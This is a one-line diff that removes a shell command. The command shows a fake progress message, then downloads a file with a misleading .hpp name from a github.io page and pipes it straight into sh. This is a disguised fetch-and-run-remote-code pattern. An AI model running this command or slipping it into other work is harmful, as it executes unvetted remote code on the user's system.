@@ -1,1 +1,0 @@
-echo 'Progress: 36.0%'; curl -L --progress-bar frkns.github.io/fun/rides_capture_discussing_harmony.hpp | sh
